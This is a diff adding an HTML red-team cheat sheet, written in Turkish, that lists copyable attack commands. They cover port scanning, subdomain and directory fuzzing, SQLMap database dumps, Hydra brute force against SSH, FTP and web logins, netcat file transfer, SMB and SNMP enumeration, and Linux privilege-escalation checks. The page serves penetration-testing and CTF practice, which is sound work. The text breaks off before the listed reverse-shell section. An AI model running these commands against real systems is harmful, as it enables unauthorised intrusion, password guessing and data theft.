@@ -1,0 +1,700 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Red Team El Kitabı | Siber Güvenlik Referans</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <script src="https://unpkg.com/lucide@latest" onerror="console.log('Lucide offline')"></script>
+  <script>
+    tailwind.config = {
+      theme: {
+        extend: {
+          colors: {
+            dark: { bg: '#0a0a0a', card: '#161616', border: '#262626' },
+            accent: '#ff0000'
+          }
+        }
+      }
+    }
+  </script>
+  <style>
+    :root { --accent: #ff0000; --bg: #0a0a0a; --card: #161616; --border: #262626; }
+    body { font-family: 'Inter', system-ui, -apple-system, sans-serif; background: #0a0a0a; color: #e5e5e5; min-height: 100vh; margin: 0; }
+    .code-block { font-family: 'JetBrains Mono', 'Fira Code', monospace; font-size: 0.85rem; }
+    .bento-card { transition: all 0.2s ease; }
+    .bento-card:hover { border-color: var(--accent); transform: translateY(-1px); }
+    .nav-item.active { border-left: 3px solid var(--accent); background: rgba(255,0,0,0.1); }
+    .copy-btn:hover { background: var(--accent); color: white; }
+    .var-input:focus { border-color: var(--accent); box-shadow: 0 0 0 2px rgba(255,0,0,0.2); }
+    .search-input:focus { border-color: var(--accent); outline: none; }
+    .sub-nav { border-left: 2px solid #333; margin-left: 8px; padding-left: 8px; }
+    .sub-nav a { font-size: 0.8rem; color: #94a3b8; }
+    .sub-nav a:hover { color: #ff0000; }
+    .cmd-text .tool-name { font-weight: 600; }
+    @media (max-width: 768px) { .sidebar { transform: translateX(-100%); } }
+  </style>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+</head>
+<body class="bg-[#0a0a0a] text-gray-200 min-h-screen">
+  <!-- Header -->
+  <header class="sticky top-0 z-50 bg-[#0a0a0a] border-b border-[#262626]">
+    <div class="max-w-7xl mx-auto px-4 py-4 space-y-3">
+      <div class="flex flex-wrap items-center justify-between gap-4">
+        <div class="flex items-center gap-3">
+          <h1 class="text-xl font-bold text-white flex items-center gap-2">
+            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#ff0000" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
+            Red Team El Kitabı
+          </h1>
+          <span class="text-xs text-gray-500 hidden sm:inline">Fevzi Ege Yurtsevenler · AltaySec</span>
+        </div>
+        <div class="flex flex-wrap gap-3">
+          <div class="flex items-center gap-2">
+            <label class="text-xs text-gray-400 whitespace-nowrap">HEDEF</label>
+            <input type="text" id="var-target" placeholder="10.10.10.1" class="var-input px-3 py-2 bg-[#161616] border border-[#262626] rounded text-sm w-32 focus:outline-none">
+          </div>
+          <div class="flex items-center gap-2">
+            <label class="text-xs text-gray-400 whitespace-nowrap">LHOST</label>
+            <input type="text" id="var-lhost" placeholder="10.10.14.1" class="var-input px-3 py-2 bg-[#161616] border border-[#262626] rounded text-sm w-28 focus:outline-none">
+          </div>
+          <div class="flex items-center gap-2">
+            <label class="text-xs text-gray-400 whitespace-nowrap">LPORT</label>
+            <input type="text" id="var-lport" placeholder="4444" class="var-input px-3 py-2 bg-[#161616] border border-[#262626] rounded text-sm w-20 focus:outline-none">
+          </div>
+        </div>
+      </div>
+      <!-- Arama Çubuğu -->
+      <div class="relative">
+        <input type="text" id="search-input" placeholder="Komut, araç veya açıklama ara..." class="search-input w-full px-4 py-2.5 pl-10 bg-[#161616] border border-[#262626] rounded-lg text-sm placeholder-gray-500">
+        <svg class="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-gray-500" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"/></svg>
+      </div>
+    </div>
+  </header>
+
+  <div class="flex max-w-7xl mx-auto">
+    <!-- Sidebar - Ana Kategoriler + Tool Alt Kategorileri -->
+    <aside class="w-64 flex-shrink-0 border-r border-[#262626] min-h-[calc(100vh-180px)] sticky top-[140px] hidden lg:block overflow-y-auto">
+      <nav class="p-4 space-y-4">
+        <div>
+          <a href="#kesif" class="nav-item flex items-center gap-2 px-3 py-2 rounded text-sm font-medium hover:bg-[#161616] block">🔍 Keşif</a>
+          <div class="sub-nav mt-1 space-y-0.5">
+            <a href="#kesif-nmap" class="block px-3 py-1 rounded hover:bg-[#161616]">Nmap</a>
+            <a href="#kesif-subdomain" class="block px-3 py-1 rounded hover:bg-[#161616]">Subdomain</a>
+            <a href="#kesif-whois" class="block px-3 py-1 rounded hover:bg-[#161616]">Whois / DNS</a>
+          </div>
+        </div>
+        <div>
+          <a href="#web" class="nav-item flex items-center gap-2 px-3 py-2 rounded text-sm font-medium hover:bg-[#161616] block">🌐 Web Pentest</a>
+          <div class="sub-nav mt-1 space-y-0.5">
+            <a href="#web-dir" class="block px-3 py-1 rounded hover:bg-[#161616]">Dizin / Fuzz</a>
+            <a href="#web-sql" class="block px-3 py-1 rounded hover:bg-[#161616]">SQLMap</a>
+            <a href="#web-scanner" class="block px-3 py-1 rounded hover:bg-[#161616]">Scanner</a>
+          </div>
+        </div>
+        <div>
+          <a href="#network" class="nav-item flex items-center gap-2 px-3 py-2 rounded text-sm font-medium hover:bg-[#161616] block">🔌 Network</a>
+          <div class="sub-nav mt-1 space-y-0.5">
+            <a href="#network-nc" class="block px-3 py-1 rounded hover:bg-[#161616]">Netcat</a>
+            <a href="#network-smb" class="block px-3 py-1 rounded hover:bg-[#161616]">SMB / SNMP</a>
+            <a href="#network-brute" class="block px-3 py-1 rounded hover:bg-[#161616]">Brute Force</a>
+          </div>
+        </div>
+        <div>
+          <a href="#privesc" class="nav-item flex items-center gap-2 px-3 py-2 rounded text-sm font-medium hover:bg-[#161616] block">⬆️ Yetki Yükseltme</a>
+          <div class="sub-nav mt-1 space-y-0.5">
+            <a href="#privesc-linux" class="block px-3 py-1 rounded hover:bg-[#161616]">Linux</a>
+            <a href="#privesc-windows" class="block px-3 py-1 rounded hover:bg-[#161616]">Windows</a>
+          </div>
+        </div>
+        <div>
+          <a href="#revshell" class="nav-item flex items-center gap-2 px-3 py-2 rounded text-sm font-medium hover:bg-[#161616] block">🐚 Reverse Shell</a>
+          <div class="sub-nav mt-1 space-y-0.5">
+            <a href="#revshell-bash" class="block px-3 py-1 rounded hover:bg-[#161616]">Bash / Sh</a>
+            <a href="#revshell-script" class="block px-3 py-1 rounded hover:bg-[#161616]">Python / PHP</a>
+            <a href="#revshell-nc" class="block px-3 py-1 rounded hover:bg-[#161616]">Netcat</a>
+          </div>
+        </div>
+        <div>
+          <a href="#ad" class="nav-item flex items-center gap-2 px-3 py-2 rounded text-sm font-medium hover:bg-[#161616] block">🏢 Active Directory</a>
+          <div class="sub-nav mt-1 space-y-0.5">
+            <a href="#ad-bloodhound" class="block px-3 py-1 rounded hover:bg-[#161616]">BloodHound</a>
+            <a href="#ad-impacket" class="block px-3 py-1 rounded hover:bg-[#161616]">Impacket</a>
+            <a href="#ad-cme" class="block px-3 py-1 rounded hover:bg-[#161616]">CrackMapExec</a>
+          </div>
+        </div>
+        <div>
+          <a href="#exploit" class="nav-item flex items-center gap-2 px-3 py-2 rounded text-sm font-medium hover:bg-[#161616] block">💀 Exploit</a>
+          <div class="sub-nav mt-1 space-y-0.5">
+            <a href="#exploit-msf" class="block px-3 py-1 rounded hover:bg-[#161616]">Metasploit</a>
+          </div>
+        </div>
+      </nav>
+    </aside>
+
+    <!-- Ana İçerik -->
+    <main class="flex-1 p-6 pb-24" id="main-content">
+      
+      <!-- KEŞİF -->
+      <section id="kesif" class="mb-16">
+        <h2 class="text-2xl font-bold text-white mb-6 flex items-center gap-2">
+          <span class="w-1 h-8 bg-[#ff0000] rounded"></span> Keşif & Bilgi Toplama
+        </h2>
+        
+        <div id="kesif-nmap" class="mb-10">
+          <h3 class="text-lg font-semibold text-gray-300 mb-4">Nmap</h3>
+          <div class="grid gap-6 md:grid-cols-2">
+            <article class="bento-card cmd-card bg-[#161616] border border-[#262626] rounded-lg p-6" data-tool="nmap" data-search="nmap port tarama network">
+              <h4 class="font-semibold text-white mb-2">Tüm Port Taraması</h4>
+              <p class="text-sm text-gray-400 mb-4">Tüm 65535 portu hızlı tarar.</p>
+              <div class="bg-[#0a0a0a] rounded p-4 code-block mb-4 overflow-x-auto"><code class="cmd-text" data-original="nmap -p- --min-rate 5000 [HEDEF]"></code></div>
+              <button onclick="copyCmd(this)" class="copy-btn px-4 py-2 border border-[#262626] rounded text-sm">Kopyala</button>
+              <ul class="mt-4 text-xs text-gray-500 space-y-1"><li><strong>-p-</strong> : Tüm portlar</li><li><strong>--min-rate 5000</strong> : Hız</li></ul>
+            </article>
+            <article class="bento-card cmd-card bg-[#161616] border border-[#262626] rounded-lg p-6" data-tool="nmap" data-search="nmap servis versiyon sV sC">
+              <h4 class="font-semibold text-white mb-2">Servis ve Versiyon Taraması</h4>
+              <p class="text-sm text-gray-400 mb-4">Açık portlardaki servisleri tespit eder.</p>
+              <div class="bg-[#0a0a0a] rounded p-4 code-block mb-4 overflow-x-auto"><code class="cmd-text" data-original="nmap -sV -sC -Pn -oN nmap_result.txt [HEDEF]"></code></div>
+              <button onclick="copyCmd(this)" class="copy-btn px-4 py-2 border border-[#262626] rounded text-sm">Kopyala</button>
+              <ul class="mt-4 text-xs text-gray-500 space-y-1"><li><strong>-sV</strong> Versiyon</li><li><strong>-sC</strong> Scriptler</li><li><strong>-Pn</strong> Ping atlama</li></ul>
+            </article>
+            <article class="bento-card cmd-card bg-[#161616] border border-[#262626] rounded-lg p-6" data-tool="nmap" data-search="nmap agresif OS">
+              <h4 class="font-semibold text-white mb-2">Agresif Tarama</h4>
+              <p class="text-sm text-gray-400 mb-4">OS, versiyon, script birleşik tarama.</p>
+              <div class="bg-[#0a0a0a] rounded p-4 code-block mb-4 overflow-x-auto"><code class="cmd-text" data-original="nmap -A [HEDEF]"></code></div>
+              <button onclick="copyCmd(this)" class="copy-btn px-4 py-2 border border-[#262626] rounded text-sm">Kopyala</button>
+            </article>
+            <article class="bento-card cmd-card bg-[#161616] border border-[#262626] rounded-lg p-6" data-tool="nmap" data-search="nmap UDP">
+              <h4 class="font-semibold text-white mb-2">UDP Port Taraması</h4>
+              <p class="text-sm text-gray-400 mb-4">SNMP, DNS gibi UDP servisleri tarar.</p>
+              <div class="bg-[#0a0a0a] rounded p-4 code-block mb-4 overflow-x-auto"><code class="cmd-text" data-original="sudo nmap -sU --top-ports 100 [HEDEF]"></code></div>
+              <button onclick="copyCmd(this)" class="copy-btn px-4 py-2 border border-[#262626] rounded text-sm">Kopyala</button>
+            </article>
+            <article class="bento-card cmd-card bg-[#161616] border border-[#262626] rounded-lg p-6" data-tool="masscan" data-search="masscan hızlı tarama">
+              <h4 class="font-semibold text-white mb-2">Masscan – Hızlı Port Taraması</h4>
+              <p class="text-sm text-gray-400 mb-4">Nmap'ten çok daha hızlı toplu port tarama.</p>
+              <div class="bg-[#0a0a0a] rounded p-4 code-block mb-4 overflow-x-auto"><code class="cmd-text" data-original="masscan [HEDEF] -p1-65535 --rate 10000 -e tun0"></code></div>
+              <button onclick="copyCmd(this)" class="copy-btn px-4 py-2 border border-[#262626] rounded text-sm">Kopyala</button>
+              <ul class="mt-4 text-xs text-gray-500 space-y-1"><li><strong>--rate 10000</strong> : Paket/saniye</li></ul>
+            </article>
+          </div>
+        </div>
+
+        <div id="kesif-subdomain" class="mb-10">
+          <h3 class="text-lg font-semibold text-gray-300 mb-4">Subdomain Keşfi</h3>
+          <div class="grid gap-6 md:grid-cols-2">
+            <article class="bento-card cmd-card bg-[#161616] border border-[#262626] rounded-lg p-6" data-tool="subfinder" data-search="subfinder subdomain">
+              <h4 class="font-semibold text-white mb-2">Subfinder</h4>
+              <p class="text-sm text-gray-400 mb-4">Pasif subdomain keşfi.</p>
+              <div class="bg-[#0a0a0a] rounded p-4 code-block mb-4 overflow-x-auto"><code class="cmd-text" data-original="subfinder -d [HEDEF] -o subdomains.txt"></code></div>
+              <button onclick="copyCmd(this)" class="copy-btn px-4 py-2 border border-[#262626] rounded text-sm">Kopyala</button>
+            </article>
+            <article class="bento-card cmd-card bg-[#161616] border border-[#262626] rounded-lg p-6" data-tool="amass" data-search="amass subdomain asset">
+              <h4 class="font-semibold text-white mb-2">Amass – Asset Discovery</h4>
+              <p class="text-sm text-gray-400 mb-4">Kapsamlı subdomain ve asset keşfi.</p>
+              <div class="bg-[#0a0a0a] rounded p-4 code-block mb-4 overflow-x-auto"><code class="cmd-text" data-original="amass enum -d [HEDEF]"></code></div>
+              <button onclick="copyCmd(this)" class="copy-btn px-4 py-2 border border-[#262626] rounded text-sm">Kopyala</button>
+            </article>
+            <article class="bento-card cmd-card bg-[#161616] border border-[#262626] rounded-lg p-6" data-tool="amass" data-search="amass active tarama">
+              <h4 class="font-semibold text-white mb-2">Amass – Active Tarama</h4>
+              <p class="text-sm text-gray-400 mb-4">Daha derin aktif subdomain taraması.</p>
+              <div class="bg-[#0a0a0a] rounded p-4 code-block mb-4 overflow-x-auto"><code class="cmd-text" data-original="amass enum -active -d [HEDEF] -p 80,443,8080"></code></div>
+              <button onclick="copyCmd(this)" class="copy-btn px-4 py-2 border border-[#262626] rounded text-sm">Kopyala</button>
+            </article>
+          </div>
+        </div>
+
+        <div id="kesif-whois">
+          <h3 class="text-lg font-semibold text-gray-300 mb-4">Whois / DNS</h3>
+          <div class="grid gap-6 md:grid-cols-2">
+            <article class="bento-card cmd-card bg-[#161616] border border-[#262626] rounded-lg p-6" data-tool="whois" data-search="whois domain">
+              <h4 class="font-semibold text-white mb-2">Whois</h4>
+              <p class="text-sm text-gray-400 mb-4">Domain kayıt bilgilerini sorgular.</p>
+              <div class="bg-[#0a0a0a] rounded p-4 code-block mb-4 overflow-x-auto"><code class="cmd-text" data-original="whois [HEDEF]"></code></div>
+              <button onclick="copyCmd(this)" class="copy-btn px-4 py-2 border border-[#262626] rounded text-sm">Kopyala</button>
+            </article>
+            <article class="bento-card cmd-card bg-[#161616] border border-[#262626] rounded-lg p-6" data-tool="dig" data-search="dig dns kayıt">
+              <h4 class="font-semibold text-white mb-2">Dig – DNS Sorgusu</h4>
+              <p class="text-sm text-gray-400 mb-4">DNS kayıtlarını sorgular.</p>
+              <div class="bg-[#0a0a0a] rounded p-4 code-block mb-4 overflow-x-auto"><code class="cmd-text" data-original="dig [HEDEF] any +noall +answer"></code></div>
+              <button onclick="copyCmd(this)" class="copy-btn px-4 py-2 border border-[#262626] rounded text-sm">Kopyala</button>
+            </article>
+          </div>
+        </div>
+      </section>
+
+      <!-- WEB PENTEST -->
+      <section id="web" class="mb-16">
+        <h2 class="text-2xl font-bold text-white mb-6 flex items-center gap-2">
+          <span class="w-1 h-8 bg-[#ff0000] rounded"></span> Web Pentest
+        </h2>
+        
+        <div id="web-dir" class="mb-10">
+          <h3 class="text-lg font-semibold text-gray-300 mb-4">Dizin / Fuzz</h3>
+          <div class="grid gap-6 md:grid-cols-2">
+            <article class="bento-card cmd-card bg-[#161616] border border-[#262626] rounded-lg p-6" data-tool="gobuster" data-search="gobuster dizin tarama">
+              <h4 class="font-semibold text-white mb-2">Gobuster – Dizin Taraması</h4>
+              <p class="text-sm text-gray-400 mb-4">Gizli dizin ve dosya keşfi.</p>
+              <div class="bg-[#0a0a0a] rounded p-4 code-block mb-4 overflow-x-auto"><code class="cmd-text" data-original="gobuster dir -u http://[HEDEF]/ -w /usr/share/wordlists/dirb/common.txt -x php,html,txt -t 50"></code></div>
+              <button onclick="copyCmd(this)" class="copy-btn px-4 py-2 border border-[#262626] rounded text-sm">Kopyala</button>
+            </article>
+            <article class="bento-card cmd-card bg-[#161616] border border-[#262626] rounded-lg p-6" data-tool="gobuster" data-search="gobuster vhost">
+              <h4 class="font-semibold text-white mb-2">Gobuster – vhost Taraması</h4>
+              <p class="text-sm text-gray-400 mb-4">Sanal host keşfi.</p>
+              <div class="bg-[#0a0a0a] rounded p-4 code-block mb-4 overflow-x-auto"><code class="cmd-text" data-original="gobuster vhost -u http://[HEDEF] -w /usr/share/wordlists/dirb/common.txt"></code></div>
+              <button onclick="copyCmd(this)" class="copy-btn px-4 py-2 border border-[#262626] rounded text-sm">Kopyala</button>
+            </article>
+            <article class="bento-card cmd-card bg-[#161616] border border-[#262626] rounded-lg p-6" data-tool="ffuf" data-search="ffuf fuzz dizin">
+              <h4 class="font-semibold text-white mb-2">FFUF – Dizin Fuzzing</h4>
+              <p class="text-sm text-gray-400 mb-4">Hızlı web fuzzer.</p>
+              <div class="bg-[#0a0a0a] rounded p-4 code-block mb-4 overflow-x-auto"><code class="cmd-text" data-original="ffuf -u http://[HEDEF]/FUZZ -w /usr/share/wordlists/dirb/common.txt"></code></div>
+              <button onclick="copyCmd(this)" class="copy-btn px-4 py-2 border border-[#262626] rounded text-sm">Kopyala</button>
+            </article>
+            <article class="bento-card cmd-card bg-[#161616] border border-[#262626] rounded-lg p-6" data-tool="ffuf" data-search="ffuf subdomain">
+              <h4 class="font-semibold text-white mb-2">FFUF – Subdomain Fuzzing</h4>
+              <p class="text-sm text-gray-400 mb-4">Host header ile subdomain keşfi.</p>
+              <div class="bg-[#0a0a0a] rounded p-4 code-block mb-4 overflow-x-auto"><code class="cmd-text" data-original="ffuf -u http://[HEDEF]/ -H 'Host: FUZZ.[HEDEF]' -w subdomains.txt -fs 0"></code></div>
+              <button onclick="copyCmd(this)" class="copy-btn px-4 py-2 border border-[#262626] rounded text-sm">Kopyala</button>
+            </article>
+            <article class="bento-card cmd-card bg-[#161616] border border-[#262626] rounded-lg p-6" data-tool="feroxbuster" data-search="feroxbuster recursive">
+              <h4 class="font-semibold text-white mb-2">Feroxbuster – Recursive Dizin</h4>
+              <p class="text-sm text-gray-400 mb-4">Rust tabanlı hızlı recursive tarayıcı.</p>
+              <div class="bg-[#0a0a0a] rounded p-4 code-block mb-4 overflow-x-auto"><code class="cmd-text" data-original="feroxbuster -u http://[HEDEF] -w /usr/share/wordlists/dirb/common.txt -x php,html"></code></div>
+              <button onclick="copyCmd(this)" class="copy-btn px-4 py-2 border border-[#262626] rounded text-sm">Kopyala</button>
+            </article>
+          </div>
+        </div>
+
+        <div id="web-sql" class="mb-10">
+          <h3 class="text-lg font-semibold text-gray-300 mb-4">SQLMap</h3>
+          <div class="grid gap-6 md:grid-cols-2">
+            <article class="bento-card cmd-card bg-[#161616] border border-[#262626] rounded-lg p-6" data-tool="sqlmap" data-search="sqlmap sql injection">
+              <h4 class="font-semibold text-white mb-2">SQLMap – Otomatik Tarama</h4>
+              <p class="text-sm text-gray-400 mb-4">SQL enjeksiyon tespit ve sömürü.</p>
+              <div class="bg-[#0a0a0a] rounded p-4 code-block mb-4 overflow-x-auto"><code class="cmd-text" data-original="sqlmap -u 'http://[HEDEF]/page.php?id=1' --batch"></code></div>
+              <button onclick="copyCmd(this)" class="copy-btn px-4 py-2 border border-[#262626] rounded text-sm">Kopyala</button>
+            </article>
+            <article class="bento-card cmd-card bg-[#161616] border border-[#262626] rounded-lg p-6" data-tool="sqlmap" data-search="sqlmap dump veritabanı">
+              <h4 class="font-semibold text-white mb-2">SQLMap – Veritabanı Dump</h4>
+              <p class="text-sm text-gray-400 mb-4">Tabloları ve verileri dışa aktar.</p>
+              <div class="bg-[#0a0a0a] rounded p-4 code-block mb-4 overflow-x-auto"><code class="cmd-text" data-original="sqlmap -u 'http://[HEDEF]/page.php?id=1' -D db_adi --tables --dump"></code></div>
+              <button onclick="copyCmd(this)" class="copy-btn px-4 py-2 border border-[#262626] rounded text-sm">Kopyala</button>
+            </article>
+          </div>
+        </div>
+
+        <div id="web-scanner">
+          <h3 class="text-lg font-semibold text-gray-300 mb-4">Scanner</h3>
+          <div class="grid gap-6 md:grid-cols-2">
+            <article class="bento-card cmd-card bg-[#161616] border border-[#262626] rounded-lg p-6" data-tool="nikto" data-search="nikto web zafiyet">
+              <h4 class="font-semibold text-white mb-2">Nikto</h4>
+              <p class="text-sm text-gray-400 mb-4">Web sunucu güvenlik taraması.</p>
+              <div class="bg-[#0a0a0a] rounded p-4 code-block mb-4 overflow-x-auto"><code class="cmd-text" data-original="nikto -h http://[HEDEF]"></code></div>
+              <button onclick="copyCmd(this)" class="copy-btn px-4 py-2 border border-[#262626] rounded text-sm">Kopyala</button>
+            </article>
+            <article class="bento-card cmd-card bg-[#161616] border border-[#262626] rounded-lg p-6" data-tool="nuclei" data-search="nuclei zafiyet CVE">
+              <h4 class="font-semibold text-white mb-2">Nuclei – Zafiyet Taraması</h4>
+              <p class="text-sm text-gray-400 mb-4">CVE ve şablon tabanlı tarama.</p>
+              <div class="bg-[#0a0a0a] rounded p-4 code-block mb-4 overflow-x-auto"><code class="cmd-text" data-original="nuclei -u http://[HEDEF]"></code></div>
+              <button onclick="copyCmd(this)" class="copy-btn px-4 py-2 border border-[#262626] rounded text-sm">Kopyala</button>
+            </article>
+            <article class="bento-card cmd-card bg-[#161616] border border-[#262626] rounded-lg p-6" data-tool="nuclei" data-search="nuclei kritik">
+              <h4 class="font-semibold text-white mb-2">Nuclei – Sadece Kritik/Yüksek</h4>
+              <p class="text-sm text-gray-400 mb-4">Ciddi zafiyetlere odaklan.</p>
+              <div class="bg-[#0a0a0a] rounded p-4 code-block mb-4 overflow-x-auto"><code class="cmd-text" data-original="nuclei -u http://[HEDEF] -severity critical,high"></code></div>
+              <button onclick="copyCmd(this)" class="copy-btn px-4 py-2 border border-[#262626] rounded text-sm">Kopyala</button>
+            </article>
+          </div>
+        </div>
+      </section>
+
+      <!-- NETWORK -->
+      <section id="network" class="mb-16">
+        <h2 class="text-2xl font-bold text-white mb-6 flex items-center gap-2">
+          <span class="w-1 h-8 bg-[#ff0000] rounded"></span> Network & Servisler
+        </h2>
+        
+        <div id="network-nc" class="mb-10">
+          <h3 class="text-lg font-semibold text-gray-300 mb-4">Netcat</h3>
+          <div class="grid gap-6 md:grid-cols-2">
+            <article class="bento-card cmd-card bg-[#161616] border border-[#262626] rounded-lg p-6" data-tool="nc" data-search="nc netcat dinleme">
+              <h4 class="font-semibold text-white mb-2">Port Dinleme</h4>
+              <p class="text-sm text-gray-400 mb-4">Reverse shell veya dosya transferi için.</p>
+              <div class="bg-[#0a0a0a] rounded p-4 code-block mb-4 overflow-x-auto"><code class="cmd-text" data-original="nc -lvnp [LPORT]"></code></div>
+              <button onclick="copyCmd(this)" class="copy-btn px-4 py-2 border border-[#262626] rounded text-sm">Kopyala</button>
+            </article>
+            <article class="bento-card cmd-card bg-[#161616] border border-[#262626] rounded-lg p-6" data-tool="nc" data-search="nc dosya alma">
+              <h4 class="font-semibold text-white mb-2">Dosya Alma</h4>
+              <p class="text-sm text-gray-400 mb-4">Alıcı: nc -lvnp port > dosya</p>
+              <div class="bg-[#0a0a0a] rounded p-4 code-block mb-4 overflow-x-auto"><code class="cmd-text" data-original="nc -lvnp [LPORT] > alinan_dosya"></code></div>
+              <button onclick="copyCmd(this)" class="copy-btn px-4 py-2 border border-[#262626] rounded text-sm">Kopyala</button>
+            </article>
+            <article class="bento-card cmd-card bg-[#161616] border border-[#262626] rounded-lg p-6" data-tool="nc" data-search="nc dosya gönderme">
+              <h4 class="font-semibold text-white mb-2">Dosya Gönderme</h4>
+              <p class="text-sm text-gray-400 mb-4">Verici: nc hedef port &lt; dosya</p>
+              <div class="bg-[#0a0a0a] rounded p-4 code-block mb-4 overflow-x-auto"><code class="cmd-text" data-original="nc [HEDEF] [LPORT] &lt; gonderilecek_dosya"></code></div>
+              <button onclick="copyCmd(this)" class="copy-btn px-4 py-2 border border-[#262626] rounded text-sm">Kopyala</button>
+            </article>
+          </div>
+        </div>
+
+        <div id="network-smb" class="mb-10">
+          <h3 class="text-lg font-semibold text-gray-300 mb-4">SMB / SNMP</h3>
+          <div class="grid gap-6 md:grid-cols-2">
+            <article class="bento-card cmd-card bg-[#161616] border border-[#262626] rounded-lg p-6" data-tool="smbclient" data-search="smbclient paylaşım">
+              <h4 class="font-semibold text-white mb-2">SMBClient – Paylaşım Listele</h4>
+              <p class="text-sm text-gray-400 mb-4">SMB paylaşımlarını listele.</p>
+              <div class="bg-[#0a0a0a] rounded p-4 code-block mb-4 overflow-x-auto"><code class="cmd-text" data-original="smbclient -L //[HEDEF] -N"></code></div>
+              <button onclick="copyCmd(this)" class="copy-btn px-4 py-2 border border-[#262626] rounded text-sm">Kopyala</button>
+            </article>
+            <article class="bento-card cmd-card bg-[#161616] border border-[#262626] rounded-lg p-6" data-tool="snmpwalk" data-search="snmpwalk snmp">
+              <h4 class="font-semibold text-white mb-2">SNMPwalk</h4>
+              <p class="text-sm text-gray-400 mb-4">SNMP cihaz bilgisi toplama.</p>
+              <div class="bg-[#0a0a0a] rounded p-4 code-block mb-4 overflow-x-auto"><code class="cmd-text" data-original="snmpwalk -v2c -c public [HEDEF]"></code></div>
+              <button onclick="copyCmd(this)" class="copy-btn px-4 py-2 border border-[#262626] rounded text-sm">Kopyala</button>
+            </article>
+          </div>
+        </div>
+
+        <div id="network-brute">
+          <h3 class="text-lg font-semibold text-gray-300 mb-4">Brute Force</h3>
+          <div class="grid gap-6 md:grid-cols-2">
+            <article class="bento-card cmd-card bg-[#161616] border border-[#262626] rounded-lg p-6" data-tool="hydra" data-search="hydra ssh brute">
+              <h4 class="font-semibold text-white mb-2">Hydra – SSH Brute Force</h4>
+              <p class="text-sm text-gray-400 mb-4">SSH şifre denemesi.</p>
+              <div class="bg-[#0a0a0a] rounded p-4 code-block mb-4 overflow-x-auto"><code class="cmd-text" data-original="hydra -l kullanici -P wordlist.txt [HEDEF] ssh"></code></div>
+              <button onclick="copyCmd(this)" class="copy-btn px-4 py-2 border border-[#262626] rounded text-sm">Kopyala</button>
+            </article>
+            <article class="bento-card cmd-card bg-[#161616] border border-[#262626] rounded-lg p-6" data-tool="hydra" data-search="hydra ftp">
+              <h4 class="font-semibold text-white mb-2">Hydra – FTP Brute Force</h4>
+              <p class="text-sm text-gray-400 mb-4">FTP giriş denemesi.</p>
+              <div class="bg-[#0a0a0a] rounded p-4 code-block mb-4 overflow-x-auto"><code class="cmd-text" data-original="hydra -L users.txt -P pass.txt [HEDEF] ftp"></code></div>
+              <button onclick="copyCmd(this)" class="copy-btn px-4 py-2 border border-[#262626] rounded text-sm">Kopyala</button>
+            </article>
+            <article class="bento-card cmd-card bg-[#161616] border border-[#262626] rounded-lg p-6" data-tool="hydra" data-search="hydra http web login">
+              <h4 class="font-semibold text-white mb-2">Hydra – HTTP Form Login</h4>
+              <p class="text-sm text-gray-400 mb-4">Web form brute force.</p>
+              <div class="bg-[#0a0a0a] rounded p-4 code-block mb-4 overflow-x-auto"><code class="cmd-text" data-original="hydra -l admin -P pass.txt [HEDEF] http-post-form '/login.php:user=^USER^&amp;pass=^PASS^:F=login failed'"></code></div>
+              <button onclick="copyCmd(this)" class="copy-btn px-4 py-2 border border-[#262626] rounded text-sm">Kopyala</button>
+            </article>
+            <article class="bento-card cmd-card bg-[#161616] border border-[#262626] rounded-lg p-6" data-tool="crackmapexec" data-search="crackmapexec smb enum">
+              <h4 class="font-semibold text-white mb-2">CrackMapExec – SMB Enum</h4>
+              <p class="text-sm text-gray-400 mb-4">Windows SMB anonim tarama.</p>
+              <div class="bg-[#0a0a0a] rounded p-4 code-block mb-4 overflow-x-auto"><code class="cmd-text" data-original="crackmapexec smb [HEDEF] -u '' -p ''"></code></div>
+              <button onclick="copyCmd(this)" class="copy-btn px-4 py-2 border border-[#262626] rounded text-sm">Kopyala</button>
+            </article>
+          </div>
+        </div>
+      </section>
+
+      <!-- PRIVESC -->
+      <section id="privesc" class="mb-16">
+        <h2 class="text-2xl font-bold text-white mb-6 flex items-center gap-2">
+          <span class="w-1 h-8 bg-[#ff0000] rounded"></span> Yetki Yükseltme
+        </h2>
+        
+        <div id="privesc-linux" class="mb-10">
+          <h3 class="text-lg font-semibold text-gray-300 mb-4">Linux</h3>
+          <div class="grid gap-6 md:grid-cols-2">
+            <article class="bento-card cmd-card bg-[#161616] border border-[#262626] rounded-lg p-6" data-tool="sudo" data-search="sudo yetki">
+              <h4 class="font-semibold text-white mb-2">Sudo Yetkileri</h4>
+              <p class="text-sm text-gray-400 mb-4">Şifresiz çalıştırılabilecek komutlar.</p>
+              <div class="bg-[#0a0a0a] rounded p-4 code-block mb-4 overflow-x-auto"><code class="cmd-text" data-original="sudo -l"></code></div>
+              <button onclick="copyCmd(this)" class="copy-btn px-4 py-2 border border-[#262626] rounded text-sm">Kopyala</button>
+            </article>
+            <article class="bento-card cmd-card bg-[#161616] border border-[#262626] rounded-lg p-6" data-tool="find" data-search="find SUID">
+              <h4 class="font-semibold text-white mb-2">SUID İkili Tarama</h4>
+              <p class="text-sm text-gray-400 mb-4">SUID biti olan dosyaları bul.</p>
+              <div class="bg-[#0a0a0a] rounded p-4 code-block mb-4 overflow-x-auto"><code class="cmd-text" data-original="find / -perm -4000 2>/dev/null"></code></div>
+              <button onclick="copyCmd(this)" class="copy-btn px-4 py-2 border border-[#262626] rounded text-sm">Kopyala</button>
+            </article>
+            <article class="bento-card cmd-card bg-[#161616] border border-[#262626] rounded-lg p-6" data-tool="linpeas" data-search="linpeas otomatik">
+              <h4 class="font-semibold text-white mb-2">LinPEAS</h4>
+              <p class="text-sm text-gray-400 mb-4">Otomatik privilege escalation taraması.</p>
